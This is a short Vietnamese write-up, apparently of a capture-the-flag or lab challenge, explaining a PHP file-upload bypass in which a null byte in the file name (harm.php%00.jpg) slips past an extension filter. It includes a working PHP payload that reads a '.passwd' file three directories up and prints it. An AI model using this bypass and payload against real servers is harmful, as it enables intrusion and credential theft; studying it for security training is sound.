Có 1 lỗ hổng khi upload file trong php là: do php vẫn dùng những hàm của C khi xử lí file, mà trong C kí tự `\0`(URLencode là `%00`) là kí tự null, đánh dấu kết thúc string, sẽ không đọc thêm kí tự nào sau đó nữa. Như vậy khi truyền vào tên file ví dụ như `harm.php%00.jpg`, bộ lọc extension vẫn pass qua vì đuôi .jpg, nhưng hàm xử lí file sẽ chỉ xử lí file có tên `harm.php` mà thôi.  Code của file `harm.php` như sau:

```php
 <?php
$file = fopen("../../../.passwd", "r");

while(! feof($file)) {
  $line = fgets($file);
  echo $line. "<br>";
}

fclose($file);
?> 
```

Upload file này lên và truy cập vào đường dẫn của nó sẽ lấy được password